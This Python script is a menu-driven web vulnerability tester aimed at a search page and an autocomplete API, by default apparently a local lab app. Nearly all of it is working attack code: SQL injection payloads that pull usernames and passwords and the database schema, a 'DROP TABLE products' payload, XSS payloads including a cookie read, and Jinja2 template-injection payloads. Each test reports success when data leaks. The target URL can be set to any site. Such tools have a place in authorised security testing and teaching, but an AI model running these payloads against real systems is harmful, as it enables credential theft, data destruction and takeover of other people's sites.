#!/usr/bin/env python3
"""
Search Functionality Vulnerability Testing Script
Educational purposes only - DO NOT use on production systems
"""

import requests
import time
import json

class SearchVulnerabilityTester:
    def __init__(self, base_url="http://127.0.0.1:5002"):
        self.base_url = base_url
        self.session = requests.Session()
    
    def test_sql_injection(self):
        """Test SQL Injection vulnerabilities in search"""
        print("🔍 Testing SQL Injection in Search...")
        print("=" * 50)
        
        # SQL Injection payloads for search
        sql_payloads = [
            # Basic UNION-based SQL injection
            "laptop' UNION SELECT 1,username,password,4,5,6,7 FROM users --",
            
            # Extract database structure
            "' UNION SELECT 1,name,sql,4,5,6,7 FROM sqlite_master WHERE type='table' --",
            
            # Extract user data
            "' UNION SELECT 1,username||':'||password,email,4,5,6,7 FROM users --",
            
            # Boolean-based blind SQL injection
            "laptop' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0 --",
            
            # Extract all tables
            "' UNION SELECT 1,group_concat(name),3,4,5,6,7 FROM sqlite_master WHERE type='table' --",
        ]
        
        for i, payload in enumerate(sql_payloads, 1):
            try:
                print(f"\n{i}. Testing payload: {payload[:60]}...")
                response = self.session.get(f"{self.base_url}/search", params={"q": payload})
                
                if response.status_code == 200:
                    # Check for database content leakage
                    if any(keyword in response.text.lower() for keyword in ['admin', 'users', 'password', 'email']):
                        print(f"   ✅ SQL Injection SUCCESS - Database content leaked!")
                        if 'admin' in response.text.lower():
                            print(f"   🎯 Admin data potentially exposed")
                    elif 'sqlite_master' in response.text.lower():
                        print(f"   ✅ SQL Injection SUCCESS - Database schema exposed!")
                    else:
                        print(f"   ❌ SQL Injection failed or no obvious data leakage")
                else:
                    print(f"   🔶 HTTP Error: {response.status_code}")
                    
            except Exception as e:
                print(f"   🔶 Error: {e}")
        
        print(f"\n{'='*50}")
    
    def test_xss(self):
        """Test XSS vulnerabilities in search"""
        print("\n🚨 Testing XSS in Search...")
        print("=" * 50)
        
        # XSS payloads for search
        xss_payloads = [
            # Basic XSS
            "<script>alert('XSS in Search')</script>",
            
            # Image-based XSS
            "<img src=x onerror=alert('XSS')>",
            
            # SVG XSS
            "<svg onload=alert('XSS')>",
            
            # Event handler XSS
            "<input onfocus=alert('XSS') autofocus>",
            
            # HTML injection
            "<h1>Hacked by Attacker</h1>",
            
            # Cookie stealing XSS (safe version for testing)
            "<script>console.log('Cookie access: ' + document.cookie)</script>",
        ]
        
        for i, payload in enumerate(xss_payloads, 1):
            try:
                print(f"\n{i}. Testing payload: {payload[:40]}...")
                response = self.session.get(f"{self.base_url}/search", params={"q": payload})
                
                if response.status_code == 200:
                    # Check if payload is reflected without escaping
                    if payload in response.text:
                        print(f"   ✅ XSS SUCCESS - Payload reflected without escaping!")
                        print(f"   🎯 Payload found in response body")
                    elif payload.replace('<', '&lt;').replace('>', '&gt;') in response.text:
                        print(f"   ❌ XSS blocked - Payload is HTML encoded")
                    else:
                        print(f"   ❌ XSS failed - Payload not found in response")
                else:
                    print(f"   🔶 HTTP Error: {response.status_code}")
                    
            except Exception as e:
                print(f"   🔶 Error: {e}")
        
        print(f"\n{'='*50}")
    
    def test_ssti(self):
        """Test Server-Side Template Injection"""
        print("\n🔥 Testing SSTI in Search...")
        print("=" * 50)
        
        # SSTI payloads for search
        ssti_payloads = [
            # Basic SSTI test
            "{{7*7}}",
            
            # Flask/Jinja2 specific
            "{{config}}",
            "{{request}}",
            "{{''.__class__}}",
            
            # More advanced SSTI
            "{{''.__class__.__mro__[2].__subclasses__()}}",
        ]
        
        for i, payload in enumerate(ssti_payloads, 1):
            try:
                print(f"\n{i}. Testing payload: {payload}")
                response = self.session.get(f"{self.base_url}/search", params={"q": payload})
                
                if response.status_code == 200:
                    # Check for SSTI execution
                    if payload == "{{7*7}}" and "49" in response.text:
                        print(f"   ✅ SSTI SUCCESS - Mathematical expression executed (7*7=49)!")
                    elif payload == "{{config}}" and "SECRET_KEY" in response.text:
                        print(f"   ✅ SSTI SUCCESS - Flask config exposed!")
                    elif "class" in response.text and payload in response.text:
                        print(f"   ✅ SSTI SUCCESS - Template injection working!")
                    elif payload in response.text:
                        print(f"   🔶 SSTI POSSIBLE - Payload reflected (check manually)")
                    else:
                        print(f"   ❌ SSTI failed - No template execution detected")
                else:
                    print(f"   🔶 HTTP Error: {response.status_code}")
                    
            except Exception as e:
                print(f"   🔶 Error: {e}")
        
        print(f"\n{'='*50}")
    
    def test_autocomplete_vulnerabilities(self):
        """Test autocomplete API vulnerabilities"""
        print("\n🔄 Testing Autocomplete API Vulnerabilities...")
        print("=" * 50)
        
        # Test SQL injection in autocomplete
        sql_payloads = [
            "test' UNION SELECT username FROM users --",
            "' OR 1=1 --",
            "test'; DROP TABLE products; --"
        ]
        
        for i, payload in enumerate(sql_payloads, 1):
            try:
                print(f"\n{i}. Testing autocomplete SQLi: {payload[:40]}...")
                response = self.session.get(f"{self.base_url}/api/search_autocomplete", 
                                          params={"term": payload})
                
                if response.status_code == 200:
                    data = response.json()
                    if data and any('admin' in str(item).lower() for item in data):
                        print(f"   ✅ SQL Injection SUCCESS in autocomplete!")
                    else:
                        print(f"   ❌ SQL Injection failed in autocomplete")
                else:
                    print(f"   🔶 HTTP Error: {response.status_code}")
                    
            except Exception as e:
                print(f"   🔶 Error: {e}")
        
        print(f"\n{'='*50}")
    
    def test_information_disclosure(self):
        """Test information disclosure in error messages"""
        print("\n📊 Testing Information Disclosure...")
        print("=" * 50)
        
        # Payloads to trigger errors
        error_payloads = [
            "test' AND (SELECT 1/0) --",  # Division by zero
            "test'; INVALID SQL SYNTAX --",  # Syntax error
            "{{undefined_variable}}",  # Template error
        ]
        
        for i, payload in enumerate(error_payloads, 1):
            try:
                print(f"\n{i}. Testing error disclosure: {payload[:40]}...")
                response = self.session.get(f"{self.base_url}/search", params={"q": payload})
                
                if response.status_code == 200:
                    # Check for detailed error messages
                    if any(keyword in response.text.lower() for keyword in 
                          ['error', 'exception', 'traceback', 'sqlite', 'query']):
                        print(f"   ✅ Information disclosure found in error messages!")
                        if 'query' in response.text.lower():
                            print(f"   🎯 SQL query exposed in error message")
                    else:
                        print(f"   ❌ No detailed error information disclosed")
                else:
                    print(f"   🔶 HTTP Error: {response.status_code}")
                    
            except Exception as e:
                print(f"   🔶 Error: {e}")
        
        print(f"\n{'='*50}")
    
    def run_comprehensive_test(self):
        """Run all search vulnerability tests"""
        print("🎯 COMPREHENSIVE SEARCH VULNERABILITY TESTING")
        print("=" * 60)
        print("Testing multiple vulnerability types in search functionality")
        print("=" * 60)
        
        # Run all tests
        self.test_sql_injection()
        self.test_xss()
        self.test_ssti()
        self.test_autocomplete_vulnerabilities()
        self.test_information_disclosure()
        
        print(f"\n🎊 TESTING COMPLETE!")
        print("=" * 60)
        print("🔧 Manual Testing Recommendations:")
        print("1. Test XSS payloads in browser to see actual execution")
        print("2. Use Burp Suite for advanced SQL injection testing")
        print("3. Try SSTI payloads that attempt code execution")
        print("4. Test edge cases and filter bypasses")
        print("5. Combine multiple vulnerabilities for chained attacks")

def main():
    print("🔥 SEARCH VULNERABILITY TESTING TOOL")
    print("Educational purposes only - test on authorized systems only!")
    
    base_url = input("Enter base URL (default: http://127.0.0.1:5002): ").strip()
    if not base_url:
        base_url = "http://127.0.0.1:5002"
    
    tester = SearchVulnerabilityTester(base_url)
    
    print("\nSelect test type:")
    print("1. SQL Injection only")
    print("2. XSS only")
    print("3. SSTI only")
    print("4. Autocomplete vulnerabilities")
    print("5. Information disclosure")
    print("6. Comprehensive test (all vulnerabilities)")
    
    choice = input("Choice (1-6): ").strip()
    
    if choice == "1":
        tester.test_sql_injection()
    elif choice == "2":
        tester.test_xss()
    elif choice == "3":
        tester.test_ssti()
    elif choice == "4":
        tester.test_autocomplete_vulnerabilities()
    elif choice == "5":
        tester.test_information_disclosure()
    elif choice == "6":
        tester.run_comprehensive_test()
    else:
        print("Invalid choice. Running comprehensive test...")
        tester.run_comprehensive_test()

if __name__ == "__main__":
    main()
